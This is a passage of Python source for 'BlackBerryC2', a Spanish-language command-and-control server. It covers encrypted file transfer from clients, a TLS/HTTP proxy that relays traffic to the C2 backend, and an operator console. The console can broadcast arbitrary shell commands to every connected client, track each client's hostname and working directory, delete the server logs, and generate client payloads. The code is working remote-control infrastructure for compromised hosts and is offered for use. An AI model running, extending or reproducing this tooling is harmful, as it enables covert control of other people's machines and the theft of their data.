        
        with open(out_path, 'wb') as f:
            while received < file_size:
                # Recibir chunk
                raw_len = recvall(sock, 4, timeout=timeout)
                if not raw_len:
                    if not suppress_print:
                        print(f"\n{ALERT} {RED}Error: Conexión perdida{RESET}")
                    log_transfer("get", file_name, file_size, expected_hash, 
                                time.time() - start_time_total, False, "Conexión perdida", silent=suppress_print)
                    return False
                    
                packet_len = struct.unpack('!I', raw_len)[0]
                packet = recvall(sock, packet_len, timeout=timeout)
                if not packet or len(packet) < 13:
                    if not suppress_print:
                        print(f"\n{ALERT} {RED}Error: Chunk inválido{RESET}")
                    log_transfer("get", file_name, file_size, expected_hash, 
                                time.time() - start_time_total, False, "Chunk inválido", silent=suppress_print)
                    return False
                
                # Descifrar
                flag = packet[0]
                
                if session:
                    session.add_bytes_received(4 + packet_len, compressed=(flag > 0))
                
                nonce = packet[1:13]
                ct = packet[13:]

                aesgcm = AESGCM(aes_key)
                chunk = aesgcm.decrypt(nonce, ct, None)
                
                # Descomprimir
                if flag == 2:  # Zstandard
                    if not use_zstd:
                        if not suppress_print:
                            print(f"\n{ALERT} {RED}Error: Recibido zstd pero no disponible{RESET}")
                        log_transfer("get", file_name, file_size, expected_hash, 
                                    time.time() - start_time_total, False, "Zstd no disponible", silent=suppress_print)
                        return False
                    try:
                        chunk = dctx.decompress(chunk)
                        if session:
                            session.supports_compression = True
                    except Exception as e:
                        if not suppress_print:
                            print(f"\n{ALERT} {RED}Error descomprimiendo con Zstandard{RESET}")
                        logging.exception(f"Error descomprimiendo zstd: {e}")
                        log_transfer("get", file_name, file_size, expected_hash, 
                                    time.time() - start_time_total, False, "Error Zstandard", silent=suppress_print)
                        return False
                elif flag == 1:  # zlib
                    try:
                        chunk = zlib.decompress(chunk)
                        if session:
                            session.supports_compression = True
                    except Exception as e:
                        if not suppress_print:
                            print(f"\n{ALERT} {RED}Error descomprimiendo{RESET}")
                        logging.exception(f"Error descomprimiendo zlib: {e}")
                        log_transfer("get", file_name, file_size, expected_hash, 
                                    time.time() - start_time_total, False, "Error zlib", silent=suppress_print)
                        return False

                # Escribir y actualizar hash
                f.write(chunk)
                sha.update(chunk)
                received += len(chunk)
                
                # Progreso — solo si NO estamos en modo silencioso (background recursivo)
                if not suppress_print:
                    current_time = time.time()
                    if current_time - last_report_time >= 0.5:
                        elapsed = current_time - start_time
                        speed = (received - last_report_bytes) / (current_time - last_report_time) if (current_time - last_report_time) > 0 else 0
                        eta = estimate_time_remaining(file_size - received, speed)
                        
                        show_progress_bar(
                            received, 
                            file_size, 
                            width=40,
                            prefix=f'{format_bytes(received)}/{format_bytes(file_size)}',
                            suffix=f'{format_speed(speed)} | ETA: {eta}'
                        )
                        
                        last_report_time = current_time
                        last_report_bytes = received

        # Completar barra solo en modo interactivo
        if not suppress_print:
            show_progress_bar(file_size, file_size, width=40, 
                             prefix=f'{format_bytes(file_size)}/{format_bytes(file_size)}', 
                             suffix='Completado')

        # Verificar integridad
        actual_hash = sha.hexdigest()
        elapsed = time.time() - start_time_total
        
        if received != file_size:
            if not suppress_print:
                print(f"{ALERT} {RED}Error: Tamaño incorrecto (recibido: {format_bytes(received)}, esperado: {format_bytes(file_size)}){RESET}")
            log_transfer("get", file_name, file_size, expected_hash, elapsed, False, "Tamaño incorrecto", silent=suppress_print)
            return False
        
        if actual_hash != expected_hash:
            if not suppress_print:
                print(f"{ALERT} {RED}Error: Hash no coincide{RESET}")
                print(f"  Esperado: {expected_hash}")
                print(f"  Recibido: {actual_hash}")
            else:
                logging.warning(f"[BG] Hash no coincide para {file_name}")
            log_transfer("get", file_name, file_size, expected_hash, elapsed, False, "Hash no coincide", silent=suppress_print)
            return False

        avg_speed = received / elapsed if elapsed > 0 else 0
        
        if not suppress_print:
            print(f"{B_GREEN}[+] Archivo recibido en {elapsed:.1f}s ({format_speed(avg_speed)}){RESET}")
            print(f"{B_GREEN}[+] Guardado: {out_path}{RESET}")
        
        log_transfer("get", file_name, file_size, expected_hash, elapsed, True, silent=suppress_print)
        
        # Limpiar destino para que no afecte la siguiente descarga
        if session and getattr(session, 'expected_file_dest', None):
            session.expected_file_dest = None

        return True

    except Exception as e:
        if not suppress_print:
            print(f"\n{ALERT} {RED}Error recibiendo archivo: {e}{RESET}")
        logging.exception("Error en receive_file_stream")
        log_transfer("get", file_name, file_size if 'file_size' in locals() else 0, 
                     expected_hash if 'expected_hash' in locals() else "unknown", 
                     time.time() - start_time_total if 'start_time_total' in locals() else 0, 
                     False, str(e), silent=suppress_print)
        return False

def parse_proxy_arguments(cmd):
    """Parsear argumentos del comando proxy daemon v2.1"""
    args = {
        'gui': 'gui' in cmd.lower(),
        'stats': '--stats' in cmd.lower(),
        'mode': 'auto',
        'tls_host': '0.0.0.0',
        'tls_port': 9948,
        'http_host': '0.0.0.0',
        'http_port': 8080,
        'https_port': 8443,
        'target_host': '127.0.0.1',
        'target_port': 9949,
        'certfile': None,
        'keyfile': None,
        'verbose': 0
    }
    
    # Detectar modo
    mode_match = re.search(r'(?:--mode|-m)\s+(\w+)', cmd, re.IGNORECASE)
    if mode_match:
        mode = mode_match.group(1).lower()
        if mode in ['auto', 'tls', 'http', 'https', 'both', 'all']:
            args['mode'] = mode
    
    # TLS
    tls_host = re.search(r'--tls-host\s+(\S+)', cmd, re.IGNORECASE)
    if tls_host:
        args['tls_host'] = tls_host.group(1)
    tls_port = re.search(r'--tls-port\s+(\d+)', cmd, re.IGNORECASE)
    if tls_port:
        args['tls_port'] = int(tls_port.group(1))
    
    # HTTP
    http_host = re.search(r'--http-host\s+(\S+)', cmd, re.IGNORECASE)
    if http_host:
        args['http_host'] = http_host.group(1)
    http_port = re.search(r'--http-port\s+(\d+)', cmd, re.IGNORECASE)
    if http_port:
        args['http_port'] = int(http_port.group(1))
    https_port = re.search(r'--https-port\s+(\d+)', cmd, re.IGNORECASE)
    if https_port:
        args['https_port'] = int(https_port.group(1))
    
    # Target
    target_host = re.search(r'--target-host\s+(\S+)', cmd, re.IGNORECASE)
    if target_host:
        args['target_host'] = target_host.group(1)
    target_port = re.search(r'--target-port\s+(\d+)', cmd, re.IGNORECASE)
    if target_port:
        args['target_port'] = int(target_port.group(1))
    
    # Certificados
    cert = re.search(r'--cert\s+(\S+)', cmd, re.IGNORECASE)
    if cert:
        args['certfile'] = cert.group(1)
    key = re.search(r'--key\s+(\S+)', cmd, re.IGNORECASE)
    if key:
        args['keyfile'] = key.group(1)
    
    # Verbose
    if '-vv' in cmd.lower():
        args['verbose'] = 2
    elif '-v' in cmd.lower() or '--verbose' in cmd.lower():
        args['verbose'] = 1
    
    return args

def stop_proxy_tls_command():
    """Detiene el proxy TLS daemon de forma ordenada"""
    global tls_proxy
    
    if not PROXY_AVAILABLE:
        print(f"{ALERT} {RED}Proxy daemon no disponible{RESET}")
        return
    
    if not tls_proxy:
        print(f"{B_YELLOW}[!] No hay proxy daemon en ejecución{RESET}")
        print(f"{B_CYAN}[INFO] Usa 'proxy' para iniciarlo{RESET}")
        return
    
    if not tls_proxy._running:
        print(f"{B_YELLOW}[!] El proxy no está activo{RESET}")
        tls_proxy = None
        return
    
    try:
        # Obtener estadísticas antes de detener
        stats = tls_proxy.print_stats()
        uptime = stats.get('uptime_str', 'N/A')
        connections = stats.get('connections_handled', 0)
        http_sessions = stats.get('http_sessions', 0)
        
        print(f"{B_CYAN}[*] Deteniendo proxy daemon...{RESET}")
        print(f"{B_CYAN}    Uptime: {uptime}{RESET}")
        print(f"{B_CYAN}    Conexiones manejadas: {connections}{RESET}")
        print(f"{B_CYAN}    Sesiones HTTP activas: {http_sessions}{RESET}")
        
        tls_proxy.stop()
        time.sleep(1.5)  # Dar tiempo para cierre ordenado
        
        print(f"{B_GREEN}[+] Proxy detenido correctamente{RESET}")
        tls_proxy = None
        
    except Exception as e:
        logging.exception(f"Error deteniendo proxy: {e}")
        print(f"{ALERT} {RED}Error deteniendo proxy: {e}{RESET}")
        print(f"{B_YELLOW}[!] Intentando forzar cierre...{RESET}")
        tls_proxy = None

def handle_proxy_tls_command(cmd):
    """Manejar comando proxy v2.1"""
    global tls_proxy, tls_proxy_gui_process
    
    if not PROXY_AVAILABLE:
        print(f"{ALERT} {RED}Error: BlackBerryHTTPs_TLSProxyDaemon no está disponible{RESET}")
        print(f"{YELLOW}Asegúrate de que BlackBerryHTTPs_TLSProxyDaemon.py está en el mismo directorio{RESET}")
        return
    
    try:
        args = parse_proxy_arguments(cmd)
        
        # === MODO ESTADÍSTICAS ===
        if args['stats'] and not args['gui']:
            if tls_proxy and tls_proxy._running:
                print(f"\n{B_BLUE}[+] Estadísticas del proxy daemon{RESET}\n")
                tls_proxy.print_stats()
            else:
                print(f"{ALERT} {RED}El proxy daemon no está en ejecución{RESET}")
                print(f"{YELLOW}Usa 'proxy' para iniciarlo{RESET}")
            return
        
        # === MODO GUI ===
        if args['gui']:
            if tls_proxy_gui_process and tls_proxy_gui_process.is_alive():
                print(f"{B_YELLOW}[!] GUI ya está corriendo (PID: {tls_proxy_gui_process.pid}){RESET}")
                return
            
            print(f"{B_YELLOW}[*] Iniciando BlackBerry TLS Proxy GUI...{RESET}")
            
            def run_tls_proxy_gui():
                try:
                    import BlackBerryHTTPs_TLSProxyGUI
                    BlackBerryHTTPs_TLSProxyGUI.main()
                except Exception as e:
                    logging.exception(f"Error iniciando GUI: {e}")
            
            tls_proxy_gui_process = multiprocessing.Process(target=run_tls_proxy_gui, daemon=True)
            tls_proxy_gui_process.start()
            
            print(f"{B_GREEN}[+] Proxy TLS GUI iniciado (PID: {tls_proxy_gui_process.pid}){RESET}")
            print(f"{B_CYAN}[INFO] Use 'stop-proxy-gui' para detenerlo{RESET}")
            return
        
        # === MODO DAEMON ===
        if tls_proxy and tls_proxy._running:
            print(f"{B_YELLOW}[!] Ya hay un proxy daemon en ejecución{RESET}")
            stats = tls_proxy.print_stats()
            try:
                response = input(f"\n{B_CYAN}¿Desea reiniciarlo? (s/n): {RESET}").strip().lower()
                if response not in ['s', 'si', 'sí', 'y', 'yes']:
                    print(f"{B_CYAN}[INFO] Manteniendo proxy actual{RESET}")
                    return
                else:
                    print(f"{ALERT} {YELLOW}Deteniendo proxy...{RESET}")
                    tls_proxy.stop()
                    time.sleep(2)
                    tls_proxy = None
            except (KeyboardInterrupt, EOFError):
                print(f"\n{B_CYAN}[INFO] Manteniendo proxy actual{RESET}")
                return
        
        # Iniciar nuevo proxy daemon
        
        tls_proxy = BlackBerryProxy(
            mode=args['mode'],
            listen_host_tls=args['tls_host'],
            listen_port_tls=args['tls_port'],
            listen_host_http=args['http_host'],
            listen_port_http=args['http_port'],
            listen_port_https=args['https_port'],
            target_host=args['target_host'],
            target_port=args['target_port'],
            certfile=args['certfile'],
            keyfile=args['keyfile'],
            verbose=args['verbose']
        )
        
        if tls_proxy.start(blocking=False):
            time.sleep(1)
            stats = tls_proxy.print_stats()
        else:
            print(f"{ALERT} {RED}Error iniciando el proxy{RESET}")
            tls_proxy = None
            
    except Exception as e:
        logging.exception(f"Error en handle_proxy_tls_command: {e}")
        print(f"{ALERT} {RED}Error: {e}{RESET}")
        print(f"{ALERT} {RED}Error: {e}{RESET}")

def rebind_server(new_host, new_port):
    """Reconfigura el servidor para escuchar en un nuevo host/puerto."""
    global server_socket, HOST, PORT
    
    try:
        with conn_lock:
            active_clients = len(connections)
            if active_clients > 0:
                try:
                    confirm = input(f"{YELLOW}[!] Hay {active_clients} cliente(s) conectado(s). ¿Continuar? (s/n): {RESET}").strip().lower()
                    if confirm not in ['s', 'si', 'sí', 'y', 'yes']:
                        print(f"{B_CYAN}[INFO] Operación cancelada.{RESET}")
                        return
                except (KeyboardInterrupt, EOFError):
                    print(f"\n{B_CYAN}[INFO] Operación cancelada.{RESET}")
                    return
        
        with server_socket_lock:
            old_socket = server_socket
            if old_socket:
                try:
                    old_socket.close()
                    logging.info("Socket antiguo cerrado")
                except Exception as e:
                    logging.warning(f"Error cerrando socket antiguo: {e}")
            
            with conn_lock:
                for cid, session in list(connections.items()):
                    try:
                        session.socket.close()
                    except Exception as e:
                        logging.debug(f"Error cerrando socket de sesión {cid}: {e}")
                connections.clear()
            
            HOST = new_host
            PORT = new_port
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server_socket.bind((HOST, PORT))
            server_socket.listen(50)
            
        logging.info(f"Servidor rebind exitoso a {HOST}:{PORT}")
        print(f"{B_GREEN}[+] Servidor ahora escucha en {HOST}:{PORT}{RESET}")
        
        threading.Thread(target=accept_connections, args=(server_socket,), daemon=True).start()
        
    except OSError as e:
        logging.error(f"Error al rebind del servidor: {e}")
        print(f"{ALERT} {RED}Error: No se pudo vincular a {new_host}:{new_port} - {e}{RESET}")
    except Exception as e:
        logging.exception(f"Error inesperado al rebind: {e}")
        print(f"{ALERT} {RED}Error inesperado: {e}{RESET}")

def execute_local_command_safe(command):
    """
    Ejecuta comandos locales de forma segura.
    Soporta comandos interactivos como nano, vim, etc.
    """
    try:
        # Lista de comandos interactivos que necesitan TTY completo
        interactive_commands = [
            'nano', 'vim', 'vi', 'emacs', 'less', 'more', 
            'top', 'htop', 'man', 'pico', 'joe', 'micro',
            'bat', 'ranger', 'mc', 'lynx', 'w3m'
        ]
        
        # Extraer el nombre del comando base
        cmd_parts = command.split()
        cmd_name = cmd_parts[0] if cmd_parts else ""
        
        # Verificar si es un comando interactivo
        is_interactive = cmd_name in interactive_commands
        
        if is_interactive:
            # Comando interactivo: usar subprocess.call (mantiene TTY)
            print(f"{B_CYAN}{startnc} Ejecutando: {command}{RESET}")
            result_code = subprocess.call(
                command,
                shell=True,
                cwd=CURRENT_WORKING_DIR
            )
            
            if result_code == 0:
                return f"{B_GREEN}Comando se ejecuto con exito{RESET}"
            else:
                return f"{YELLOW}Comando terminó con código: {result_code}{RESET}"
        
        else:
            # Comando normal: capturar salida con timeout
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30,
                cwd=CURRENT_WORKING_DIR
            )
            
            output = ""
            if result.stdout:
                output += result.stdout
            if result.stderr:
                output += result.stderr
            
            return output if output else f"Comando ejecutado (código: {result.returncode})"
        
    except subprocess.TimeoutExpired:
        return f"{ALERT} {RED}Timeout ejecutando comando (30s){RESET}"
    except Exception as e:
        logging.exception(f"Error ejecutando comando local: {e}")
        return f"{ALERT} {RED}Error: {e}{RESET}"

def execute_local_command_system(command):
    try:
        # Lista de comandos interactivos
        interactive_commands = [
            'nano', 'vim', 'vi', 'emacs', 'less', 'more', 
            'top', 'htop', 'man', 'pico', 'joe', 'micro',
            'bat', 'ranger', 'mc', 'lynx', 'w3m'
        ]
        
        # Extraer el nombre del comando
        cmd_parts = command.split()
        cmd_name = cmd_parts[0] if cmd_parts else ""
        
        # Informar si es interactivo
        if cmd_name in interactive_commands:
            print(f"{B_CYAN}{startnc} Ejecutando: {command}{RESET}")
        
        original_dir = os.getcwd()
        os.chdir(CURRENT_WORKING_DIR)
        
        exit_code = os.system(command)
        
        os.chdir(original_dir)
        
        if exit_code == 0:
            return f"{B_GREEN}Comando ejecutado{RESET}"
        else:
            return f"{YELLOW}Comando ejecutado con código: {exit_code}{RESET}"
            
    except Exception as e:
        logging.exception(f"Error ejecutando comando con system: {e}")
        return f"{ALERT} {RED}Error: {e}{RESET}"

def send_command_to_all_clients(command, timeout=30):
    """Envía un comando a todos los clientes conectados y recopila respuestas."""
    results = {}
    
    try:
        with conn_lock:
            client_sessions = list(connections.items())
        
        if not client_sessions:
            return None
        
        print(f"{B_CYAN}[INFO] Enviando comando a {len(client_sessions)} cliente(s)...{RESET}")
        
        for cid, session in client_sessions:
            try:
                response = send_command_and_wait_response(session, command, timeout=timeout)
                hostname = session.get_hostname()
                results[cid] = {
                    'hostname': hostname,
                    'ip': session.address[0],
                    'response': response if response else "[Timeout/Error]"
                }
            except Exception as e:
                logging.exception(f"Error enviando comando a cliente {cid}: {e}")
                results[cid] = {
                    'hostname': session.get_hostname(),
                    'ip': session.address[0],
                    'response': f"[Error: {e}]"
                }
        
        return results
    except Exception as e:
        logging.exception(f"Error en send_command_to_all_clients: {e}")
        return None

def kill_connection_command(args):
    if not args:
        print(f"{ALERT} {RED}Uso: kill <client_id|ip>{RESET}")
        return

    target = args[0]

    with conn_lock:

        if target.isdigit():
            cid = int(target)

            if cid not in connections:
                print(f"{ALERT} {RED}Cliente #{cid} no encontrado{RESET}")
                return

            session = connections[cid]
            ip = session.address[0]
            port = session.address[1]

            print(f"{B_YELLOW}{ALERT} ¿Matar conexión?{RESET}")
            print(f"    ID: {cid}")
            print(f"    IP: {ip} - {port}")
            print(f"    Host: {getattr(session, 'hostname', 'N/A')}")

            if input(f"{B_CYAN}¿Continuar? [s/N]: {RESET}").strip().lower() != 's':
                print(f"{B_YELLOW}[!] Cancelado{RESET}")
                return

            try:
                session.socket.close()
            except:
                pass

            del connections[cid]
            print(f"{B_GREEN}[+] Conexión {B_YELLOW}#{cid}{RESET}{B_GREEN} {ip}:{port} terminada{RESET}")

        else:
            ip = target
            to_kill = [cid for cid, s in connections.items() if s.ip == ip]

            if not to_kill:
                print(f"{ALERT} {RED}No se encontraron conexiones de {ip}{RESET}")
                return

            if input(f"{B_CYAN}¿Matar {len(to_kill)} conexión(es)? [s/N]: {RESET}").strip().lower() != 's':
                print(f"{B_YELLOW}[!] Cancelado{RESET}")
                return

            for cid in to_kill:
                try:
                    connections[cid].socket.close()
                except:
                    pass
                del connections[cid]

            print(f"{B_GREEN}[+] {len(to_kill)} conexión(es) terminada(s){RESET}")

def interactive_shell():
    """Bucle principal de interacción con el operador."""
    global CURRENT_WORKING_DIR
    global PROMPT_TOOLKIT_AVAILABLE

    global VERBOSE_MODE
    
    history_file = setup_temp_history()
    
    _has_prompt_session = False
    if PROMPT_TOOLKIT_AVAILABLE and history_file:
        try:
            completer = BlackBerryCompleter(COMMANDS)
            prompt_session = PromptSession(
                history=FileHistory(history_file),
                auto_suggest=AutoSuggestFromHistory(),
                completer=completer,
                complete_while_typing=False
            )
            _has_prompt_session = True
        except Exception as e:
            logging.exception(f"Error configurando prompt_toolkit: {e}")
            PROMPT_TOOLKIT_AVAILABLE = False

    # ── Activar patch_stdout para que los prints de workers de background
    #    aparezcan ENCIMA del prompt sin corromper la línea de entrada ──────
    _patch_ctx = None
    if PROMPT_TOOLKIT_AVAILABLE and _has_prompt_session and _pt_patch_stdout is not None:
        try:
            _patch_ctx = _pt_patch_stdout(raw=True)
            _patch_ctx.__enter__()
        except Exception as e:
            logging.debug(f"patch_stdout no disponible: {e}")
            _patch_ctx = None

    try:
      while True:
        try:
            if PROMPT_TOOLKIT_AVAILABLE and _has_prompt_session:
                cmd = prompt_session.prompt(f"BlackBerry> ").strip()
            else:
                # Fallback sin prompt_toolkit: mostrar mensajes de background antes del prompt
                _drain_bg_log()
                cmd = input(f"{B_BLUE}{BOLD}BlackBerry> {RESET}").strip()
        except (KeyboardInterrupt, EOFError):
            print(f"\n{YELLOW}{BOLD}Usa 'exit' para salir.{RESET}")
            continue
        except Exception as e:
            logging.exception(f"Error leyendo input: {e}")
            continue

        if not cmd:
            continue
            
        parts = cmd.split()
        base_cmd = parts[0].lower()

        # ==================== COMANDO ALL ====================
        if base_cmd == "all":
            if len(parts) < 2:
                print(f"{ALERT} {RED}Uso: all <comando>{RESET}")
                print(f"{YELLOW}Ejemplo: all whoami{RESET}")
                continue
            
            command_to_send = ' '.join(parts[1:])
            results = send_command_to_all_clients(command_to_send)
            
            if not results:
                print(f"{YELLOW}[!] No hay clientes conectados{RESET}")
                continue
            
            print(f"\n{B_GREEN}{'='*60}{RESET}")
            print(f"{B_GREEN}Respuestas de {len(results)} cliente(s):{RESET}")
            print(f"{B_GREEN}{'='*60}{RESET}\n")
            
            for cid, data in sorted(results.items()):
                print(f"{B_CYAN}━━━ Cliente #{cid} ({data['hostname']}) ━━━{RESET}")
                print(f"{B_WHITE}{data['response']}{RESET}")
                print()
            
            continue

        # ==================== COMANDOS DE VERBOSIDAD ====================

        if base_cmd == "v":
            if VERBOSE_MODE == 0:
                VERBOSE_MODE = 1
                setup_logging(verbose=1)
                print(f"{B_GREEN}[+] Modo DEBUG activado (v){RESET}")
            elif VERBOSE_MODE == 1:
                VERBOSE_MODE = 0
                setup_logging(verbose=0)
                print(f"{B_YELLOW}[!] Modo SILENCIOSO activado{RESET}")
            elif VERBOSE_MODE == 2:
                    VERBOSE_MODE = 1
                    setup_logging(verbose=1)
                    print(f"{B_GREEN}[+] Modo DEBUG activado (v){RESET}")
            continue

        if base_cmd == "vv":
            if VERBOSE_MODE in [0, 1]:
                    VERBOSE_MODE = 2
                    setup_logging(verbose=2)
                    print(f"{B_CYAN}[+] Modo VERBOSE relajado activado (vv){RESET}")
            elif VERBOSE_MODE == 2:
                    VERBOSE_MODE = 0
                    setup_logging(verbose=0)
                    print(f"{B_YELLOW}[!] Modo SILENCIOSO activado{RESET}")
            continue

        # Comando CD local
        if base_cmd == "cd":
            if len(parts) < 2:
                print(f"{B_CYAN}Directorio actual: {CURRENT_WORKING_DIR}{RESET}")
            else:
                try:
                    new_dir = ' '.join(parts[1:])
                    if new_dir == "~":
                        new_dir = os.path.expanduser("~")
                    
                    target_dir = os.path.abspath(os.path.join(CURRENT_WORKING_DIR, new_dir))
                    
                    if os.path.isdir(target_dir):
                        CURRENT_WORKING_DIR = target_dir
                        print(f"{B_GREEN}[+] Directorio cambiado a: {CURRENT_WORKING_DIR}{RESET}")
                    else:
                        print(f"{ALERT} {RED}Error: El directorio no existe{RESET}")
                except Exception as e:
                    logging.exception(f"Error cambiando directorio: {e}")
                    print(f"{ALERT} {RED}Error cambiando directorio: {e}{RESET}")
            continue

        # Comandos E/e
        if base_cmd in ["e", "E"]:
            if len(parts) < 2:
                print(f"{YELLOW}Uso: E <comando>{RESET}")
                continue
            
            command_to_execute = ' '.join(parts[1:])
            print(f"{B_CYAN}[EXEC] Ejecutando: {command_to_execute}{RESET}")
            result = execute_local_command_system(command_to_execute)
            print(result)
            continue

        if base_cmd in ["help", "ayuda"]:
            help_text = f"""
{B_WHITE}{BOLD}BlackBerryC2 v2.0 - Herramienta de administración remota encriptada{RESET}

{B_GREEN}Comandos del Servidor:{RESET}
  {B_GREEN}list{RESET}{B_WHITE}                   -> Lista conexiones con estadísticas y hostname.{RESET}
  {B_GREEN}select <ID>{RESET}{B_WHITE}            -> Interactúa con una sesión.{RESET}
  {B_GREEN}all <comando>{RESET}{B_WHITE}          -> Envía comando a todos los clientes.{RESET}
  {B_GREEN}set host <HOST>{RESET}{B_WHITE}        -> Cambia el host de escucha.{RESET}
  {B_GREEN}set port <PUERTO>{RESET}{B_WHITE}      -> Cambia el puerto de escucha.{RESET}
  {B_GREEN}sVbanner "<BANNER>"{RESET}{B_WHITE}    -> Cambia el banner del servicio.{RESET}
  {B_GREEN}generate-payload{RESET}{B_WHITE}       -> Genera un payload de cliente.{RESET}
  {B_GREEN}ecdhe-keys{RESET}{B_WHITE}             -> Imprime las claves ECDHE del servidor.{RESET}
  {B_GREEN}fingerprint{RESET}{B_WHITE}            -> Muestra fingerprint ECDHE del servidor.{RESET}
  {B_GREEN}proxy-help{RESET}{B_WHITE}             -> Ayuda del proxy TLS.{RESET}
  {B_GREEN}log{RESET}{B_WHITE}                    -> Imprime el log del servidor.{RESET}
  {B_GREEN}block <IP>{RESET}{B_WHITE}             -> Bloquea IP permanentemente.{RESET}
  {B_GREEN}unblock <IP>{RESET}{B_WHITE}           -> Desbloquea IP (permanente y temporal).{RESET}
  {B_GREEN}blocklist{RESET}{B_WHITE}              -> Muestra IPs bloqueadas.{RESET}
  {B_GREEN}kill <id|ip>{RESET}{B_WHITE}           -> Mata conexión por ID o IP{RESET}

  {B_GREEN}E <comando>{RESET}{B_WHITE}            -> Ejecuta comando con os.system.{RESET}
  {B_GREEN}<cualquier comando>{RESET}{B_WHITE}    -> Se ejecuta localmente en el servidor.{RESET}
  {B_YELLOW}exit{B_RED}                           -> Salir y cerrar el servidor.{RESET}
"""
            print(help_text)
            continue

        elif base_cmd in ["help-proxy", "proxy-help"]:
            help_proxy_text = f"""
{B_WHITE}{BOLD}========== BLACKBERRY PROXY DAEMON =========={RESET}

{B_GREEN}COMANDOS:{RESET}
  {B_GREEN}proxy{RESET}                    -> Inicia proxy (modo auto)
  {B_GREEN}proxy gui{RESET}                -> Inicia interfaz gráfica
  {B_GREEN}proxy --stats{RESET}            -> Muestra estadísticas
  {B_GREEN}stop-proxy{RESET}               -> Detiene daemon
  {B_GREEN}stop-proxy-gui{RESET}            -> Detiene GUI

{B_CYAN}MODOS (--mode o -m):{RESET}
  {B_WHITE}auto{RESET}   - Detecta certificados (TLS+HTTP+HTTPS o solo HTTP)
  {B_WHITE}tls{RESET}    - Solo TLS
  {B_WHITE}http{RESET}   - Solo HTTP
  {B_WHITE}https{RESET}  - Solo HTTPS
  {B_WHITE}both{RESET}   - TLS + HTTP
  {B_WHITE}all{RESET}    - TLS + HTTP + HTTPS

{B_CYAN}CONFIGURACIÓN:{RESET}
  {B_CYAN}--tls-port <puerto>{RESET}   -> Puerto TLS (default: 9948)
  {B_CYAN}--http-port <puerto>{RESET}  -> Puerto HTTP (default: 8080)
  {B_CYAN}--https-port <puerto>{RESET} -> Puerto HTTPS (default: 8443)
  {B_CYAN}--target-port <puerto>{RESET}-> Backend C2 (default: 9949)
  {B_CYAN}--cert <ruta>{RESET}         -> Certificado TLS
  {B_CYAN}--key <ruta>{RESET}          -> Clave privada
  {B_CYAN}-v{RESET}                    -> Modo verbose

{B_YELLOW}EJEMPLOS:{RESET}
  proxy                        # Auto-detecta
  proxy --mode http            # Solo HTTP
  proxy --mode tls             # Solo TLS
  proxy --http-port 8888       # Puerto custom
  proxy -v                     # Verbose

"""
            print(help_proxy_text)
            continue

        elif base_cmd == "svbanner":
            if len(parts) < 2:
                print(f"{B_CYAN}Banner actual: {SERVICE_BANNER}{RESET}")
                print(f"{YELLOW}Uso: sVbanner \"nuevo banner\"{RESET}")
                continue
            
            new_banner = ' '.join(parts[1:])
            if (new_banner.startswith('"') and new_banner.endswith('"')) or \
               (new_banner.startswith("'") and new_banner.endswith("'")):
                new_banner = new_banner[1:-1]
                
            success, message = set_service_banner(new_banner)
            if success:
                print(f"{B_GREEN}[+] {message}{RESET}")
            else:
                print(f"{ALERT} {RED}[-] {message}{RESET}")
            continue

        elif base_cmd == "fingerprint":
            fingerprint = get_ecdhe_key_fingerprint(SERVER_PUBLIC_PEM)
            if fingerprint:
                print(f"{B_GREEN}Fingerprint ECDHE del servidor:{RESET}")
                print(f"{B_CYAN}{fingerprint}{RESET}")
            else:
                print(f"{ALERT} {RED}Error calculando fingerprint{RESET}")
            continue
        
        elif base_cmd == "proxy":
            handle_proxy_tls_command(cmd)
            continue
            
        elif base_cmd == "stop-proxy":
            stop_proxy_tls_command()
            continue
        
        elif base_cmd == "stop-proxy-gui":
            global tls_proxy_gui_process
            if tls_proxy_gui_process and tls_proxy_gui_process.is_alive():
                print(f"{B_CYAN}[*] Deteniendo GUI (PID: {tls_proxy_gui_process.pid})...{RESET}")
                tls_proxy_gui_process.terminate()
                tls_proxy_gui_process.join(timeout=5)
                if tls_proxy_gui_process.is_alive():
                    tls_proxy_gui_process.kill()
                print(f"{B_GREEN}[+] GUI detenida{RESET}")
                tls_proxy_gui_process = None
            else:
                print(f"{B_YELLOW}[!] No hay GUI en ejecución{RESET}")
            continue

        elif base_cmd == "log":
            show_logs_menu()
            continue

        elif base_cmd == "banner":
            BlackBerrybanner()
            continue

        elif base_cmd == "clean":
            try:
                log_files = [
                    f"{script_dir}/logs/BlackBerryC2_Server.log",
                    f"{script_dir}/logs/BlackBerryTLSProxy.log",
                    f"{script_dir}/logs/BlackBerryC2_ProxyDaemon.log",
                    f"{script_dir}/logs/BlackBerry_TLSProxyTraffic.log"
                ]
                
                for log_file in log_files:
                    if os.path.exists(log_file):
                        os.remove(log_file)
                        print(f"{B_GREEN}[+] Log limpiado: {os.path.basename(log_file)}{RESET}")
                        
            except Exception as e:
                logging.exception(f"Error limpiando logs: {e}")
                print(f"{ALERT} {RED}Error limpiando logs: {e}{RESET}")
            continue

        elif base_cmd == "report":
            print_report()
            continue

        elif base_cmd in ["list", "clients"]:
            try:
                with conn_lock:
                    if not connections:
                        print(f"{YELLOW}No hay conexiones activas.{RESET}")
                    else:
                        print(f"\n{B_CYAN}{'='*60}{RESET}")
                        print(f"{B_GREEN}{BOLD}Conexiones Activas{RESET}")

                        now = time.time()
                        for cid, session in connections.items():
                            with session.lock:
                                ip, port = session.address[0], session.address[1]
                                hostname = session.get_hostname()
                                sent_raw = session.bytes_sent
                                recv_raw = session.bytes_received
                                sent_comp = session.compressed_sent
                                recv_comp = session.compressed_received
                                hb_count = getattr(session, "heartbeat_count", 0)
                                start_time = getattr(session, "start_time", None)
                                
                                # Estadísticas de flood protection
                                flood_violations = getattr(session, "flood_violations", 0)
                                messages_dropped = getattr(session, "messages_dropped", 0)
                                queue_size = session.response_queue.qsize()

                            age = int(now - start_time) if start_time else -1

                            cwd_str = getattr(session, "last_cwd", None) or "?"
                            print(f"{B_WHITE}ID:{RESET} {B_GREEN}{cid}{RESET}  |  {B_BLUE}IP:{RESET} {ip}:{port}")
                            print(f"  {B_CYAN}Host:{RESET} {hostname}  {B_WHITE}cwd:{RESET} {cwd_str}")
                            print(f"  {B_YELLOW}D Sent:{RESET} {format_bytes(sent_raw)}  |  {B_YELLOW}D Recv:{RESET} {format_bytes(recv_raw)}")
